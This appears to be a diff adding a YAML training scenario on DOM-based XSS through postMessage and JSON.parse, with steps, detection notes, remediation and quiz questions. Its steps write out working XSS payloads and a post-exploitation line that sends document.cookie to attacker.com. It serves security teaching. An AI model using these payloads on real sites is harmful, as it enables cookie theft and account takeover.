@@ -1,0 +1,95 @@
+# Category: DOM-based Vulnerabilities
+name: "DOM XSS using web messages and JSON.parse"
+id: "dom-xss-web-messages-json-001"
+category: "dom_based"
+subcategory: "web_messages"
+difficulty: "practitioner"
+estimated_time: "45 minutes"
+
+description: |
+  This scenario covers DOM-based XSS where the application receives a message
+  via postMessage, parses it with JSON.parse, and uses the parsed data in a
+  dangerous sink. The attacker can send a crafted JSON message that, when
+  parsed and processed, triggers XSS.
+
+learning_objectives:
+  - Understand postMessage with JSON parsing
+  - Identify where message data is parsed and used
+  - Craft a JSON payload that triggers XSS
+  - Exploit JSON parsing vulnerabilities
+
+tools:
+  - Burp Suite
+  - Browser developer tools
+
+prerequisites:
+  - Target page has a message listener that uses JSON.parse
+  - Parsed data is used in a dangerous sink (innerHTML, eval, etc.)
+  - No origin validation or weak validation
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify message listener with JSON.parse"
+    commands:
+      - "# Look for: JSON.parse(event.data)"
+      - "# Check how the parsed data is used"
+    expected_output: "Message data is parsed and used in a sink"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Send a crafted JSON message"
+    commands:
+      - "# Payload: {\"html\": \"<img src=x onerror=alert('XSS')>\"}"
+      - "# If the application uses the html property in innerHTML, XSS occurs"
+      - "iframe.contentWindow.postMessage('{\"html\":\"<img src=x onerror=alert(\\\"XSS\\\")>\"}', '*');"
+    expected_output: "JSON is parsed and the XSS payload executes"
+    detection: "Web server logs may show the message"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Exfiltrate data via JSON payload"
+    commands:
+      - "# Payload: {\"callback\": \"fetch('http://attacker.com/steal?cookie='+document.cookie)\"}"
+    expected_output: "Data exfiltrated"
+    detection: "Attacker server logs"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1189"
+    description: "Drive-by Compromise"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "postMessage with JSON payloads"
+  log_indicators:
+    - "Cross-origin communication events"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Validate event.origin and sanitize parsed data"
+    - "Use safe methods instead of innerHTML"
+  long_term:
+    - "Implement strict CSP"
+    - "Use structured cloning for safe data transfer"
+
+variables:
+  target_url: "https://target.com/vulnerable-page"
+  json_payload: "{\"html\":\"<img src=x onerror=alert('XSS')>\"}"
+
+assessment_questions:
+  - "Why is JSON.parse dangerous when combined with user input?"
+  - "How can you safely parse and use JSON data?"
+  - "What is the difference between JSON.parse and eval?"
+
+references:
+  - url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse"
+    title: "MDN JSON.parse"
+  - url: "https://portswigger.net/web-security/dom-based/xss-using-web-messages"
+    title: "PortSwigger Web Messages"
